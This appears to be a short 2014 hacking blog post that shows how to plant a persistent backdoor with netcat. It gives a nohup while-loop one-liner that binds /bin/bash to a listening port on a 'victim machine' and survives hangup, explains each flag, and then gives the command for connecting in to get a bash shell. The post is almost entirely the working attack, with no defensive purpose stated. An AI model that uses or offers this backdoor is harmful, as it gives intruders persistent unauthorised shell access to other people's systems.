Title: [Hack] Simple Backdoor by NetCat
Date: 2014-07-06 11:03
Author: m157q
Category: Hack
Tags: hack, NetCat, nc, Backdoor
Slug: hack-simple-backdoor-by-netcat

`nohup bash -c 'while true; do nc -l -e /bin/bash -p $port; done' &`  
  
+ **nohup** makes this backdoor immune to SIGHUP  
+ **bash -c $string** will run the string as command  
+ **nc -l** let nc keep listening on the port  
+ **nc -e $sth** means excute $sth after connected  
+ **nc -p** to choose a port for nc to listen  
+ **$port** is the backdoor port set on the victim machine. You can change it to a port number whatever you like.  
+ use shell scripting **while** for keeping listening  
    
After run the command above on the victim machine, you can just type  
    
`nc $victim_ip $port`  
    
to connect to the victim machine and get a bash shell as the same uid which ran the command.  
    
    
    
    
    